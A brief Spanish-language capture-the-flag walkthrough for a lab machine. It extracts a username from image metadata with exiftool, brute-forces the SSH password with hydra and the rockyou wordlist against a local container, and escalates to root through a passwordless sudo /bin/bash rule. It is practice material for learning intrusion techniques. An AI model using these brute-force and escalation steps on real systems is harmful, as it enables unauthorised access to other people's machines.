# BorazuwarahCTF

Una vez descargada la imagen, intentamos ver si hay algún archivo oculto dentro de esta imagen usando el comando
`steghide extract -sf imagen.jpeg

Como no se obtiene info se usa otra herramienta EXIFTOOL para metadatos
`exiftool imagen.jpeg`
Se obtiene usuario en metadatos -> *borazuwarah*

Contraseña con *hydra*
`hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2`

## Escalada

`sudo -l`
*(ALL : ALL) ALL*
*(ALL) NOPASSWD: /bin/bash*
Se puede ejecutar /bin/bash sin contraseña porque está en NOPASSWD
